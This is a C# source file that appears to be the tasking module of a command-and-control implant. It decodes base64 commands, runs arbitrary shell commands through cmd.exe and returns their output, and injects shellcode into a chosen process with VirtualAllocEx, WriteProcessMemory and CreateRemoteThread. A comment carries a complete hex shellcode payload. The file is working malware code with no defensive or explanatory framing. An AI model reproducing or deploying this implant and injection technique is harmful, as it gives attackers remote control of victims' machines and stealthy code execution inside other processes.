using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;


namespace Z2
{
    class Exec
    {
        //move to helper class
        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public string newCmd(string msg)
        { 
            try
            {
                string dMsg = Comms.Base64Decode(msg.Split(':')[3]);
                Console.WriteLine(dMsg);
                string msgContent = dMsg.Split(':')[1];
                string msgType = dMsg.Split(':')[0];
                switch (msgType)
                {
                    case "cmd":
                        return cmdExe(msgContent);

                    case "inj":
                        //000000:1:1:pidNumber_fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300
                        try
                        {
                            int pid = Int32.Parse(msgContent.Split('_')[0]);
                            byte[] sc = Exec.StringToByteArray(msgContent.Split('_')[1]);
                            this.injectSc(sc,pid);
                            return String.Format("Injected {0} with SC.", pid);
                        }
                        catch
                        {
                            return "Unrecognized SC Format...";
                        }

                    case "dnl":

                        return "downloading...";
                    default:
                        return "default";


                }
            }



            catch { return "invalid command"; }
            //b64? encryption?
            //cmd:whoami
            //download:C:\file
           

        }


        public void injectSc(byte[] arr, int procId)
        {
       

            var EXECUTE_READ_WRITE = kernel32.MemoryProtection.ExecuteReadWrite;
            var PROCESS_ALL_ACCESS = kernel32.ProcessAccessFlags.All;
            var MEM_RESERVE = kernel32.AllocationType.Reserve;
            var MEM_COMMIT = kernel32.AllocationType.Commit;
            IntPtr temp;
            IntPtr nullptr = (IntPtr)null;
            uint temp2;

           IntPtr processHandle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, false, procId); //can also use PROCESS_VM_WRITE then PROCESS_CREATE_THREAD
	        IntPtr remoteBuffer = kernel32.VirtualAllocEx(processHandle, nullptr, (uint)arr.Length, (MEM_RESERVE | MEM_COMMIT), EXECUTE_READ_WRITE);
	        kernel32.WriteProcessMemory(processHandle, remoteBuffer, arr, arr.Length, out temp);
	        IntPtr remoteThread = kernel32.CreateRemoteThread(processHandle, nullptr, 0, remoteBuffer, nullptr, 0, out temp2 );
	        kernel32.CloseHandle(processHandle);



        }

        public string cmdExe(string cmd)
        {
            //https://stackoverflow.com/questions/139593/processstartinfo-hanging-on-waitforexit-why
            Process p = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/C " + cmd,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                }
            };
            p.Start();

            string cv_error = null;
            Thread et = new Thread(() => { cv_error = p.StandardError.ReadToEnd(); });
            et.Start();

            string cv_out = null;
            Thread ot = new Thread(() => { cv_out = p.StandardOutput.ReadToEnd(); });
            ot.Start();

            p.WaitForExit();
            ot.Join();
            et.Join();
            return cv_out + cv_error;
        }
    }

    
}
